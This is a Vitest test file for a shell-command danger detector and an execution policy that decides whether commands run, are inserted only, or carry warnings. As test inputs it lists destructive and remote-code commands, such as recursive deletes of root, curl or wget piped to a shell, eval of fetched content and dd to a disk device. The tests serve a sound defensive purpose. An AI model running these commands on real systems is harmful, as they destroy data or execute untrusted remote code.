import { describe, expect, it } from "vitest";
import { isDangerousCommand, isReadOnlyShellCommand, resolveDangerAction } from "./danger";

describe("isDangerousCommand", () => {
  it("flags rm -rf", () => {
    expect(isDangerousCommand("rm -rf /")).toBe(true);
    expect(isDangerousCommand("rm -fr ./tmp")).toBe(true);
  });

  it("flags force push and iex", () => {
    expect(isDangerousCommand("git push --force origin main")).toBe(true);
    expect(isDangerousCommand("iex (download)")).toBe(true);
  });

  it("flags rm recursive variants (split / long / reordered flags)", () => {
    expect(isDangerousCommand("rm -r -f /")).toBe(true);
    expect(isDangerousCommand("rm -f -r /")).toBe(true);
    expect(isDangerousCommand("rm --recursive --force /")).toBe(true);
    expect(isDangerousCommand("rm -r /important")).toBe(true);
    expect(isDangerousCommand("/bin/rm -rf ~/data")).toBe(true);
    expect(isDangerousCommand("echo hi; rm -rf /")).toBe(true);
  });

  it("flags pipe-to-shell and eval obfuscation", () => {
    expect(isDangerousCommand("curl http://x | sudo bash")).toBe(true);
    expect(isDangerousCommand("wget -qO- http://x | sh")).toBe(true);
    expect(isDangerousCommand("curl http://x | zsh")).toBe(true);
    expect(isDangerousCommand("echo Zm9v | base64 -d | bash")).toBe(true);
    expect(isDangerousCommand('eval "$(curl http://x)"')).toBe(true);
  });

  it("flags force push short flag, recursive chmod, sudo shell, dd to device", () => {
    expect(isDangerousCommand("git push -f origin main")).toBe(true);
    expect(isDangerousCommand("chmod -R 0777 /var")).toBe(true);
    expect(isDangerousCommand("chmod 777 -R /var")).toBe(true);
    expect(isDangerousCommand("sudo su -")).toBe(true);
    expect(isDangerousCommand("dd of=/dev/sda bs=1M")).toBe(true);
  });

  it("allows safe commands", () => {
    expect(isDangerousCommand("ls -la")).toBe(false);
    expect(isDangerousCommand("git status")).toBe(false);
    expect(isDangerousCommand("Get-ChildItem")).toBe(false);
    expect(isDangerousCommand("rm file.txt")).toBe(false);
    expect(isDangerousCommand("git push --force-with-lease origin main")).toBe(false);
    expect(isDangerousCommand("sudo apt update")).toBe(false);
    expect(isDangerousCommand("ssh user@host")).toBe(false);
  });

  it("recognizes read-only Docker and sudo inspection commands", () => {
    expect(isReadOnlyShellCommand("docker ps")).toBe(true);
    expect(isReadOnlyShellCommand("sudo docker ps")).toBe(true);
    expect(isReadOnlyShellCommand("sudo systemctl status ssh")).toBe(true);
    expect(isReadOnlyShellCommand("docker rm old-container")).toBe(false);
    expect(isReadOnlyShellCommand("sudo apt install curl")).toBe(false);
  });
});

describe("resolveDangerAction (shared exec policy)", () => {
  const confirm = { execMode: "confirm" as const, confirmDanger: true };
  const auto = { execMode: "auto" as const, confirmDanger: true };
  const insert = { execMode: "insert" as const, confirmDanger: true };

  it("wantRun=false never runs, silently", () => {
    expect(resolveDangerAction("rm -rf /", auto, false)).toMatchObject({
      run: false,
      note: "",
    });
  });

  it("insert mode never runs", () => {
    expect(resolveDangerAction("ls", insert, true)).toMatchObject({
      run: false,
      note: "insert-only",
    });
  });

  it("confirm + dangerous → insert-only with danger note", () => {
    expect(resolveDangerAction("rm -rf /", confirm, true)).toMatchObject({
      run: false,
      dangerous: true,
      note: "danger-insert",
    });
  });

  it("confirm + safe → runs silently", () => {
    expect(resolveDangerAction("git status", confirm, true)).toMatchObject({
      run: true,
      note: "",
    });
  });

  it("auto + dangerous → runs with warning note", () => {
    expect(resolveDangerAction("rm -rf /", auto, true)).toMatchObject({
      run: true,
      dangerous: true,
      note: "danger-auto-run",
    });
  });

  it("confirmDanger=false disables the danger downgrade", () => {
    expect(
      resolveDangerAction("rm -rf /", { execMode: "confirm", confirmDanger: false }, true),
    ).toMatchObject({ run: true, note: "" });
  });
});
